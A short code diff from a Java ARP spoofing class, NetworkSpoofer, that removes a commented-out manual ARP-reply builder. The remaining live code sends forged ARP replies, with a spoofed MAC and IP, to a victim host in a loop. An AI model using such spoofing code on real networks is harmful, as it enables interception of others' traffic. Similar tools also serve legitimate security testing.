@@ -52,22 +52,6 @@ public class NetworkSpoofer extends Thread {
     public void run() {
         Ethernet ethernet = (Ethernet) PacketBuilder.arpBuilder(victimMacAddr, ARPOperationCode.ARP_REPLY,
                 spoofedMacAddr, spoofedIpAddr, victimMacAddr, victimIpAddr);
-        /*Ethernet ethernet = new Ethernet()
-                .setDestinationMacAddress(victimMacAddr)
-                .setSourceMacAddress(StaticField.CURRENT_MAC_ADDRESS)
-                .setEtherType(EtherType.ARP)
-                .setPadding(true);
-        ARP arp = new ARP()
-                .setHardwareType(DatalinkType.EN10MB)
-                .setProtocolType(EtherType.IPV4)
-                .setHardwareAddressLength((byte) 0x06)
-                .setProtocolAddressLength((byte) 0x04)
-                .setOpCode(ARPOperationCode.ARP_REPLY)
-                .setSenderHardwareAddress(spoofedMacAddr) //spoofed
-                .setSenderProtocolAddress(spoofedIpAddr) //spoofed
-                .setTargetHardwareAddress(victimMacAddr)
-                .setTargetProtocolAddress(victimIpAddr);
-        ethernet.setPacket(arp); */
         while (!stop) {
             try {
                 sleep(to_ms);
